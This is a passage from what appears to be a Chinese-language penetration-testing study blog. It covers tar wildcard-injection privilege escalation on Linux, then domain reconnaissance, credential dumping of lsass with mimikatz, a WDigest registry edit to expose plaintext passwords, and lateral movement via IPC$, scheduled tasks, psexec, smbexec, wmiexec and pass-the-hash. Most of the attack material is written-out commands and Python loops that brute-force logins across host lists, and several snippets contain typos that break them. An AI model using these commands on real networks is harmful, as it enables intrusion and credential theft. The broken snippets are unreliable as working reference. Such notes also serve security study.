<li>计划任务会默认执行在&#x2F;usr&#x2F;local&#x2F;bin中的目标文件</li>
<li>攻击者可以在用户目录下创建一个同名文件</li>
</ul>
</li>
<li><p>命令问题：利用通配符配合命令参数自定义命令实现提权 (本地提权)</p>
<ul>
<li>寻找定时任务中包含不安全命令的操作</li>
<li>接下来对不安全命令所进行的操作进行操作使其使用不安全的命令参数</li>
</ul>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">tar：<br><span class="hljs-keyword">echo</span> &#x27;cp <span class="hljs-string">/bin/basn</span> <span class="hljs-string">/tmp/bash</span>;chmod +s <span class="hljs-string">/tmp/bash</span>&#x27; &gt;test.sh<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; &quot;</span> &gt; <span class="hljs-string">&quot;--checkpoint-action=exec=sh tesh.sh&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; &quot;</span> &gt;<span class="hljs-params">--checkpoint=1</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>权限问题：利用不安全的权限分配操作导致的定时任务覆盖</p>
<ul>
<li>一般为管理员为定时任务分配了不当的权限,例如777,导致普通用户可以对定时任务进行覆盖,从而提权</li>
</ul>
</li>
</ul>
<h4 id="数据库MYSQL"><a href="#数据库MYSQL" class="headerlink" title="数据库MYSQL"></a>数据库MYSQL</h4><p>探针IP及端口-利用漏洞获取web权限-信息收集-查看数据库配置文件-利用Mysql提权Linux</p>
<p>Mysql提权步骤与Windows中的提权步骤类似</p>
<h1 id="八、内网渗透"><a href="#八、内网渗透" class="headerlink" title="八、内网渗透"></a>八、内网渗透</h1><blockquote>
<p>内网渗透步骤：信息收集 — 权限提升 — 横向渗透 — 权限维持</p>
<p>内网与外网的区别：</p>
<p>内网 — 即局域网是指在某一区域内由多台计算机互联成的计算机组，是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。内网ip只在局域网内部具有唯一性</p>
<p>外网 — 即广域网，又称公网。是连接不同地区局域网或城域网计算机通信的远程网。外网ip具有世界范围的唯一性</p>
</blockquote>
<h3 id="内网构成"><a href="#内网构成" class="headerlink" title="内网构成"></a>内网构成</h3><p><img src="/img/22.png" srcset="/img/loading.gif" lazyload></p>
<p>在一些内网构成中会存在DMZ区，DMZ区中会存放Web服务器与Mail服务器等。同时当用户访问Web服务时会先经过防火墙在进入DMZ区中的Web服务器，并不会进入到内网服务中。如果要进一步进入内网则需要再经过一层防火墙，极大的保证了内网的安全。</p>
<p>但在一些情况下会将Web服务器放入到内网中，会存在内网的安全问题。</p>
<p><strong>域环境与工作组</strong></p>
<p>域环境与工作组的最大区别在于在域环境中存在域控制器（DC）对域内主机进行控制，但在工作组中并不存在可以对所有主机进行控制的控制器。</p>
<h3 id="信息收集-4"><a href="#信息收集-4" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">一、了解当前计算机的基本信息，为后续判断服务器角色以及网络环境等作准备<br>systeminfo 详细信息<br>net <span class="hljs-keyword">start</span> 启动服务<br>tasjlist 进程列表<br>schtasks 计划任务<br><br>二、⽹络信息收集 - 了解当前服务器的⽹络接⼝信息，为判断当前⻆⾊，功能，⽹络架构做准备<br>ipconfig /<span class="hljs-keyword">all</span> 判断存在域<br>	存在dns后缀 有域 / 无dns后缀 没有域<br>net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span>  判断存在域<br>net <span class="hljs-type">time</span> /<span class="hljs-keyword">domain</span>  判断主域<br>netstart -ano 当前网络端口开放<br>nslookup 域名追踪来源地址<br><br>三、系统默认常见用户身份:<br><span class="hljs-keyword">Domain</span> Admins : 域管理员(默认对域控制器有完全控制权)<br><span class="hljs-keyword">Domain</span> Computers : 域内机器<br><span class="hljs-keyword">Domain</span> Controllers : 域控制器<br><span class="hljs-keyword">Domain</span> Guest : 域访客，权限低<br><span class="hljs-keyword">Domain</span> Users : 域用户<br>Enterprise Admins : 企业系统管理员用户(默认对域控制器有完全控制权)<br>主要针对<span class="hljs-keyword">Domain</span> Admins/Enterprise Admins 进行攻击<br><br>四、相关⽤户收集操作命令：<br>whoami /<span class="hljs-keyword">all</span> ⽤户权限<br>net config workstation 登录信息<br>net <span class="hljs-keyword">user</span> 本地信息<br>net localgroup 本地⽤户组<br>net <span class="hljs-keyword">user</span> /<span class="hljs-keyword">domain</span> 获取域用户信息<br>net <span class="hljs-keyword">group</span> /<span class="hljs-keyword">domain</span> 获取域用户组信息<br>wmic useraccount <span class="hljs-keyword">get</span> /<span class="hljs-keyword">all</span> 涉及域用户详细信息<br>net <span class="hljs-keyword">group</span> &quot;Domain Admins&quot; /<span class="hljs-keyword">domain</span> 查询域管理员账户<br>net <span class="hljs-keyword">group</span> &quot;Enterprise Admins&quot; /<span class="hljs-keyword">domain</span> 查询管理员用户组<br>net <span class="hljs-keyword">group</span> &quot;Domain Controllers&quot; /<span class="hljs-keyword">domain</span> 查询域控制器<br><br>五、凭据信息收集 — 旨在收集各种密文、明文、口令等,为后续横向渗透做好准备<br><br>计算机用户HASH,明文获取-mimikatz(win),mimipenguin(Linux)[只支持部分Linux]<br>	当权限不足的时候,是无法运行的,需要进行权限提升<br>	当mimikatz被杀毒软件查杀时，可以使用Procdump+Mimikatz<br>	在目标机器中运行procdump并获得lsass.dmp文件<br>	再通过在自己的主机上使用Mimikatz对lsass.dmp进行还原：<br>	sekurlas::minidump lsass.dmp<br>	sekurlas::logonPasswords <span class="hljs-keyword">full</span><br><br>计算机各种协议服务口令获取-LaZagne(<span class="hljs-keyword">all</span>),XenArmor(win)<br>  根据需要配置环境路径<br>  Netsh WLAN <span class="hljs-keyword">show</span> profiles<br>  Netsh WLAN <span class="hljs-keyword">show</span> profiles <span class="hljs-type">name</span>=&quot;无线名称&quot; key=clear<br><br><span class="hljs-number">1.</span>站点源码备份文件、数据库备份文件等<br><span class="hljs-number">2.</span>各类数据库web管理入口,如PHPMyadmin<br><span class="hljs-number">3.</span>浏览器保存密码、浏览器Cookie<br><span class="hljs-number">4.</span>其他用户会话,<span class="hljs-number">3389</span>和ipc$连接记录、回收站内容<br><span class="hljs-number">5.</span>Windows 保存的WiFi密码<br><span class="hljs-number">6.</span>网络内部的各种和面膜,如:Email,VPN,FTP、OA等<br><br>六、探针主机域控架构服务：为后续横向思路做准备,针对应用,协议等各类攻击手法<br>探针域控制器名地址信息 - net <span class="hljs-type">time</span> /<span class="hljs-keyword">domain</span> nslookup ping<br>探针域内存活主机及地址信息 / nbtscan <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> （老工具）<br>	<span class="hljs-keyword">for</span> /L %I <span class="hljs-keyword">in</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) <span class="hljs-keyword">DO</span> @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.3</span>.%I |findst &quot;TTL=&quot; 自带内部命令<br>	自带内部命令,不用免杀,缺点,显示内容没有那麽多,只有目标的地址<br>	nmap masscan 第三方<br>	Powershell脚本nishang empire等：<br>    #导入模块nishang<br>    <span class="hljs-keyword">Import</span>-Moddule .\nishang.pm1<br>    #设置执行策略<br>    <span class="hljs-keyword">Set</span>-ExecutionPolicy RemoteSinged<br>    #获取模块nishang的命令函数<br>    <span class="hljs-keyword">Get</span>-command -Module nishang<br>    #获取常规计算机信息<br>    <span class="hljs-keyword">Get</span>-Information<br>    #端口扫描<br>    Invoke-PortScan -StartAddress <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.0</span> -EndAddress <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.100</span> -ResolveHost -Scanport<br>    #其他功能:删除补丁,fantanshell,凭证获取<br><br>七、探针域内主机角色及服务信息 - 利用开放端口服务及计算机名进行判断<br>	核心业务机器：<br>	<span class="hljs-number">1.</span>高级管理人员、系统管理员、财务/人事/业务人员的个人计算机<br>	<span class="hljs-number">2.</span>产品管理系统服务器<br>	<span class="hljs-number">3.</span>办公系统服务器<br>	<span class="hljs-number">4.</span>财务应用系统服务器<br>	<span class="hljs-number">5.</span>核心产品源码服务器（自建SVN、GIT）<br>	<span class="hljs-number">6.</span>数据库服务器<br>	<span class="hljs-number">7.</span>文件或网盘服务器、共享服务器<br>	<span class="hljs-number">8.</span>电子邮件服务器<br>	<span class="hljs-number">9.</span>网络监控系统服务器<br>	<span class="hljs-number">10.</span>其他服务器（内部技术文档服务器、其他监控服务器等）<br></code></pre></td></tr></table></figure>



<h3 id="域横向渗透"><a href="#域横向渗透" class="headerlink" title="域横向渗透"></a>域横向渗透</h3><p><strong>传递攻击：</strong></p>
<img src="/img/23.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" />

<p>​	域环境下进行横向渗透的传递攻击是建立在明文和hash获取介质上的一种攻击</p>
<p>​	<strong>IPC：IPC是专用管道，可以实现对远程计算机的访问—需要使用目标系统用户的账号密码，使用139、445端口。</strong></p>
<ul>
<li><p><strong>创建定时任务at&amp;schtasks</strong></p>
<p>在拿下一台内网主机后,通过本地信息搜集收集用户凭证等信息后,如何横向渗透拿下更多的主机?</p>
<p>这里仅介绍at&amp;schtasks命令的使用,在已知目标系统的用户明文密码的基础上,直接可以在远程主机上执行命令。</p>
<p>获取到某域主机权限 — minikatz得到密码(明文,hash) — 用到信息收集里面域用户的列表当作用户字典 — 用到密码明文当作密码字典 — 尝试连接 — 创建计划任务(at|schtasks) — 执行文件为后⻔或相关命令</p>
<p>利用流程:</p>
<ul>
<li><p>建立IPC链接到目标主机  <code>net use \\xx.xx.xx.xx\ipc$ &quot;password&quot; /user:god.org\administrator</code></p>
</li>
<li><p>拷⻉要执行的命令脚本到目标主机  <code>copy test.bat \\xx.xx.xx.xx\c$</code></p>
</li>
<li><p>查看目标时间,创建计划任务(at,schtasks)</p>
<ul>
<li><p><code>at \\xx.xx.xx.xx 12:00 c:\test.bat</code></p>
</li>
<li><p><code>schtasks /create /s xx.xx.xx.xx /ru &quot;SYSTEM&quot; /tn test /sc DAILY/tr c:\test.bat /F</code>  -</p>
<p><code>schtasks /run /s xx.xx.xx.xx /tn test /i</code></p>
</li>
</ul>
</li>
<li><p>删除IPC链接</p>
</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net use \\server\ipc<span class="hljs-variable">$</span><span class="hljs-string">&quot;password&quot;</span> /user:username <span class="hljs-comment"># 工作组</span><br>net use \\server\ipc<span class="hljs-variable">$</span><span class="hljs-string">&quot;password&quot;</span> /user:domain\username <span class="hljs-comment"># 域内</span><br><span class="hljs-built_in">dir</span> \\xx.xx.xx.xx\C<span class="hljs-variable">$</span>\  <span class="hljs-comment"># 查看文件列表</span><br><span class="hljs-built_in">copy</span> \\xx.xx.xx.xx\C<span class="hljs-variable">$</span>\test.bat test.bat <span class="hljs-comment"># 下载文件</span><br><span class="hljs-built_in">copy</span> test.bat\\xx.xx.xx.xx\C<span class="hljs-variable">$</span> <span class="hljs-comment"># 复制文件</span><br>net use \\xx.xx.xx.xx\C<span class="hljs-variable">$</span>\test.bat /<span class="hljs-built_in">del</span> <span class="hljs-comment"># 删除IPC</span><br>net view xx.xx.xx.xx <span class="hljs-comment"># 查看对方共享</span><br><br>建立IPC的错误代码:<br><span class="hljs-number">5</span> : 拒绝访问，可能是使用的用户不是管理员权限，需要权限提升<br><span class="hljs-number">51</span> : 网络问题，Windows无法找到网络路径<br><span class="hljs-number">53</span> : 找不到网络路径，可能是IP地址错误，或者是目标没有开机，目标Lanmanserver服务没有开启，有防火墙等问题<br><span class="hljs-number">67</span> : 找不到网络名，本地Lanmanserver服务没有开启，目标删除IPC<span class="hljs-variable">$</span><br><span class="hljs-number">1219</span> : 提供的凭据和已存在的凭据产生冲突，说明已经建立IPC<span class="hljs-variable">$</span>，需要先删除<br><span class="hljs-number">1326</span> : 账号密码错误<br><span class="hljs-number">1792</span> : 目标NetLogon服务未启动，连接域控常出现此类情况<br><span class="hljs-number">2242</span> : 用户密码过期<br><br>建立IPC失败的原因:<br><span class="hljs-number">1</span>.目标系统不是NT或以上的操作系统<br><span class="hljs-number">2</span>.对方没有打开IPC<span class="hljs-variable">$</span>共享<br><span class="hljs-number">3</span>.对方未开启<span class="hljs-number">139</span>，<span class="hljs-number">445</span>端口，或者为防火墙屏蔽<br><span class="hljs-number">4</span>.输入命令，账号密码错误<br></code></pre></td></tr></table></figure>


</li>
<li><p><strong>横向渗透明文HASH传递atexec-impacket</strong></p>
<p>atexec工具方便快捷,可以支持hash，但是会受到杀毒软件或防护的影响。需要对软件进行免杀。</p>
<ul>
<li><code>atexec.exe ./administrator:password@xx.xx.xx.xx &quot;whoami&quot;</code></li>
<li><code>atexec.exe god/administrator:password@xx.xx.xx.xx &quot;whoami&quot;</code></li>
<li><code>atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7./administrator:password@xx.xx.xx.xx &quot;whoami&quot;</code></li>
</ul>
</li>
<li><p><strong>横向渗透明文HASH传递批量利用</strong></p>
<ul>
<li><p>第一步拿到WebServer权限</p>
</li>
<li><p>下一步对服务器上的密码进行获取（包括主机密码）</p>
</li>
<li><p>利用已获得的密码探针存活主机</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sas">for /F %<span class="hljs-title function_">%i</span> i<span class="hljs-meta">n</span>(ips.txt) <span class="hljs-keyword">do</span> net use \\%<span class="hljs-title function_">%i</span>\ipc$<span class="hljs-string">&quot;password&quot;</span> /user:administrator #批量检测IP对应明文连接<br>for /F %<span class="hljs-title function_">%i</span> i<span class="hljs-meta">n</span>(ips.txt) <span class="hljs-keyword">do</span> atexec.exe ./administrator:password@%<span class="hljs-title function_">%i</span> whoami #批量检测IP对应明文回显版<br>for /F %<span class="hljs-title function_">%i</span> i<span class="hljs-meta">n</span>(pass.txt) <span class="hljs-keyword">do</span> atexec.exe ./administrator:%<span class="hljs-title function_">%i</span>@xx.xx.xx.xx whoami #批量检测IP对应明文回显版<br>for /F %<span class="hljs-title function_">%i</span> i<span class="hljs-meta">n</span>(hash.txt) <span class="hljs-keyword">do</span> atexec.exe -hashes :%<span class="hljs-title function_">%i</span> ./administrator@xx.xx.xx.xx whoami #批量检测HASH对应明文回显版<br></code></pre></td></tr></table></figure>
</li>
<li><p>同时可以使用python编写代码脚本进行探针</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,time<br>ips=&#123;<span class="hljs-string">&#x27;192.168.3.21&#x27;</span>,<span class="hljs-string">&#x27;192.168.3.25&#x27;</span>,<span class="hljs-string">&#x27;192.168.3.29&#x27;</span>,<span class="hljs-string">&#x27;192.168.3.30&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>&#125;<br>user = &#123;<span class="hljs-string">&#x27;Administrator&#x27;</span>,<span class="hljs-string">&#x27;boss&#x27;</span>,<span class="hljs-string">&#x27;dbadmin&#x27;</span>,<span class="hljs-string">&#x27;fileadmin&#x27;</span>,<span class="hljs-string">&#x27;mack&#x27;</span><span class="hljs-string">&#x27;mary&#x27;</span><span class="hljs-string">&#x27;vpnadm&#x27;</span><span class="hljs-string">&#x27;webadmin&#x27;</span>&#125;<br>passs = &#123;<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin!@#45&#x27;</span>,<span class="hljs-string">&#x27;Admin12345&#x27;</span>&#125;<br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> ips:<br>	<span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> users:<br>		<span class="hljs-keyword">for</span> mima <span class="hljs-keyword">in</span> passs:<br>			<span class="hljs-built_in">exec</span> = <span class="hljs-string">&quot;net use \\&quot;</span>+<span class="hljs-string">&quot;\\&quot;</span>+ip+<span class="hljs-string">&quot;\ipc$ &quot;</span>+mima+<span class="hljs-string">&quot; /user:god\\&quot;</span>+user<br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-----&gt;&quot;</span>+<span class="hljs-built_in">exec</span>+<span class="hljs-string">&quot;&lt;-----&quot;</span>)<br>      os.system(<span class="hljs-built_in">exec</span>)<br>      time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#pip install pyinstaller</span><br><span class="hljs-comment">#pyinstaller -F test.py 生成可执行EXE</span><br></code></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>**横向渗透中会遇到的问题 **</p>
<blockquote>
<p> Windows系统LM HASH及NTLM Hash加密算法,个人系统在Windows vista后,服务器系统在Windows 2003以后,认证方式均为NTLM Hash。</p>
<p>Windows2012以上版本默认关闭wdigest,攻击者无法从内存中获取明文密码</p>
<p>Windows2012以下版本安装KB2871997补丁,也会导致无法获取明文密码</p>
<p>对于以上的情况：</p>
<ul>
<li><p>利用哈希hash传递(pth,ptk等)进行渗透</p>
</li>
<li><p>利用其他服务协议(SMB,WMI等)进行HASH传递</p>
</li>
<li><p>利用注册表操作开启Wdigest Auth值进行获取</p>
<p><code>reg add HTML\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1/f</code>  —  通过修改注册表将wdigest开启，从而可以获得明文密码。</p>
</li>
<li><p>利用工具或第三方平台(Hachcat)进行破解获取Windows NTML Hash  <code>hashcat -a 0 -m 1000 file --force</code></p>
</li>
</ul>
</blockquote>
</li>
<li><p><strong>域横向移动SMB服务利用-psexec,smbexec</strong></p>
<p>利用SMB服务可以通过明文或hash传递来远程执行,条件445服务端口开放。</p>
<p><strong>psexec第一种 : 先有ipc链接,psexec需要明文或hash传递</strong></p>
<ul>
<li><code>net use \\xx.xx.xx.xx\ipc$ &quot;password&quot; /user:administrator</code></li>
<li><code>psexec \\xx.xx.xx.xx -s cmd  #需要先有ipc链接 -s以system权限运行</code></li>
</ul>
<p><strong>psexec第二种:不用建立IPC直接提供明文账户密码 （同时也可以使用impacket包中的psexec，但需要注意免杀）</strong></p>
<ul>
<li><code>psexec \\xx.xx.xx.xx -u administrator -p password -s cmd  </code></li>
<li><code>psexec -hashes :$HASH$ ./administrtaor@xx.xx.xx.xx  #官方pstools的psexec无法使用HASH连接</code></li>
<li><code>psexec -hashes :$HASH$ domain/administrtaor@xx.xx.xx.xx  </code></li>
<li><code>psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrtaor@xx.xx.xx.xx  </code></li>
</ul>
<p><strong>smbexec无需先ipc链接 明文或HASH传递</strong></p>
<ul>
<li><code>smbexec god/administrator:password@xx.xx.xx.xx</code></li>
<li><code>smbexec ./administrator:password@xx.xx.xx.xx</code></li>
<li><code>smbexec -hashes :$HASH$ ./administrtaor@xx.xx.xx.xx</code></li>
<li><code>smbexec -hashes :$HASH$ domain/administrtaor@xx.xx.xx.xx  </code></li>
<li><code>smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrtaor@xx.xx.xx.xx  </code></li>
</ul>
</li>
<li><p><strong>域横向移动WMI服务利用-cscript,wmiexec,wmic</strong></p>
<p> WMI(windows Management Instrumentation)时通过135端口进行利用,支持用户名明文或者hash的方式进行认证,并且该方法不会在目标日志系统留下痕迹。</p>
<p><strong>自带WMIC 明文传递 无回显</strong></p>
<ul>
<li><code>wmic /node:xx.xx.xx.xx /user:administrator /password:... process call create&quot;cmd.exe /c ipconfig &gt;C:\test.txt</code></li>
</ul>
<p><strong>自带cscript 明文传递 有回显</strong></p>
<ul>
<li><code>cscript //nologo wmiexec.vbs /shell xx.xx.xx.xx Administrator password</code></li>
</ul>
<p><strong>套件impacket wmiexec 明文或HASH传递 有回显exe版本</strong></p>
<ul>
<li><code>wmiexec ./administrator:password@xx.xx.xx.xx &quot;whoami&quot;</code></li>
<li><code>wmiexec god/administrator:password@xx.xx.xx.xx &quot;whoami&quot;</code></li>
<li><code>wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrtaor@xx.xx.xx.xx &quot;whoami&quot;  </code></li>
</ul>
</li>
<li><p><strong>可以用python编写代码脚本进行Hash值的传递</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,time<br>ips=&#123;<span class="hljs-string">&#x27;192.168.3.21&#x27;</span>,<span class="hljs-string">&#x27;192.168.3.25&#x27;</span>,<span class="hljs-string">&#x27;192.168.3.29&#x27;</span>,<span class="hljs-string">&#x27;192.168.3.30&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>&#125;<br>user = &#123;<span class="hljs-string">&#x27;Administrator&#x27;</span>,<span class="hljs-string">&#x27;boss&#x27;</span>,<span class="hljs-string">&#x27;dbadmin&#x27;</span>,<span class="hljs-string">&#x27;fileadmin&#x27;</span>,<span class="hljs-string">&#x27;mack&#x27;</span><span class="hljs-string">&#x27;mary&#x27;</span><span class="hljs-string">&#x27;vpnadm&#x27;</span><span class="hljs-string">&#x27;webadmin&#x27;</span>&#125;<br>hashs = &#123;<span class="hljs-string">&#x27;ccef208c6485269c20db2cad21734fe7&#x27;</span>,<span class="hljs-string">&#x27;518b98ad4178a53695dc997aa02d455c&#x27;</span>&#125;<br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> ips:<br>	<span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> users:<br>		<span class="hljs-keyword">for</span> mimahash <span class="hljs-keyword">in</span> hashs:<br>      <span class="hljs-comment"># wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrtaor@xx.xx.xx.xx &quot;whoami&quot;</span><br>			<span class="hljs-built_in">exec</span> = <span class="hljs-string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="hljs-string">&quot;god/&quot;</span>+user+<span class="hljs-string">&quot;@&quot;</span>+ip+<span class="hljs-string">&quot;whoami&quot;</span><br>      exec1 = <span class="hljs-string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="hljs-string">&quot;./&quot;</span>+user+<span class="hljs-string">&quot;@&quot;</span>+ip+<span class="hljs-string">&quot;whoami&quot;</span><br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-----&gt;&quot;</span>+<span class="hljs-built_in">exec</span>+<span class="hljs-string">&quot;&lt;-----&quot;</span>)<br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-----&gt;&quot;</span>+exec1+<span class="hljs-string">&quot;&lt;-----&quot;</span>)<br>      os.system(<span class="hljs-built_in">exec</span>)<br>      os.system(exec1)<br>      time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#pip install pyinstaller</span><br><span class="hljs-comment">#pyinstaller -F test.py 生成可执行EXE</span><br></code></pre></td></tr></table></figure>


</li>
<li><p><strong>域横向 PTH&amp;PTK&amp;PTT</strong></p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">PTH(<span class="hljs-params">pass</span> <span class="hljs-params">the</span> <span class="hljs-params">hash</span>)</span>   # 利用lm或ntlm的值进行的渗透测试<br><span class="hljs-constructor">PTT(<span class="hljs-params">pass</span> <span class="hljs-params">the</span> <span class="hljs-params">ticket</span>)</span> # 利用的票据凭证TGT进行的渗透测试<br><span class="hljs-constructor">PTK(<span class="hljs-params">pass</span> <span class="hljs-params">the</span> <span class="hljs-params">key</span>)</span>    # 利用的ekeys aes256进行的渗透测试<br>PTH在内网渗透种是一种很经典的攻击方式,原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务,而不用提供明文密码。<br>如果禁用了ntlm认证,PsExec无法利用获得的ntml hash进行远程连接,但是使用mimikatz还是可以攻击成功。对于<span class="hljs-number">8.1</span>/<span class="hljs-number">2012</span>r2,安装补丁kb2871997的win7/<span class="hljs-number">2008</span>r/<span class="hljs-number">8</span>/<span class="hljs-number">2012</span>等,可以利用AES keys代替NT hash来实现ptk攻击<br>总结:KB2871997补丁后的影响<br>pth : 没打补丁用户都可以连接,打了补丁只能administrator连接<br>ptk : 打了补丁才能用户都可以连接,采用aes256连接<br>https:<span class="hljs-comment">//www.freebuf.com/column/220740.html</span><br>PTT攻击的部分就不是简单的NTLM认证了,它是利用Kerberos协议进行攻击的,这里就介绍三种常⻅的<br>攻击方法:MS14-<span class="hljs-number">068</span>,Golden ticket,SILVER ticket,简单来说就是将连接合法的票据注入到内存中实现连接。<br>MS14-<span class="hljs-number">068</span>基于漏洞,Golden ticket(⻩金票据),SILVER ticket(白银票据)<br>其中Golden ticket(⻩金票据),SILVER ticket(白银票据)属于权限维持技术<br>MS14-<span class="hljs-number">068</span>造成的危害是允许域内任何一个普通用户,将自己提升至域管理权限。微软给出的补丁是kb3011780<br></code></pre></td></tr></table></figure>



<p><strong>PTH — mimikatz :</strong></p>
<p>1.先通过mimikatz创建pth凭据：</p>
<p><code>sekurlsa::pth /user:administrator /domain:god /ntlm:$HASH$</code></p>
<p><code>sekurlsa::pth /user:administrator /domain:workgroup /ntlm:$HASH$</code></p>
<p>2.接下来对前期收集的IP地址进行测试</p>
<p><code>dir \\xx.xx.xx.xx\c$</code></p>
<p>3.下一步便可以使用at&amp;schtasks创建定时任务对目标机器进行攻击</p>
<p><strong>PTK — mimikatz :</strong></p>
<p>对于打了kb2871997补丁的用户需要采用aes256连接</p>
<p>1.获取aes信息</p>
<p><code>sekurlsa::ekeys </code></p>
<p>2.创建ptk凭据</p>
<p><code>sekurlsa::pth /user:administrator /domain:god /aes256:$AES256$</code></p>
<p><strong>PTT — mimikatz :</strong></p>
<p>不是简单的NTLM认证了,它是利用Kerberos协议进行攻击的</p>
<p>缺陷:ptt只能保持10个小时,如果能拿到10个小时内的凭据,可以成功</p>
<p>Kerberos协议（类似于互联网与服务器相连中的Cookie）：</p>
<ul>
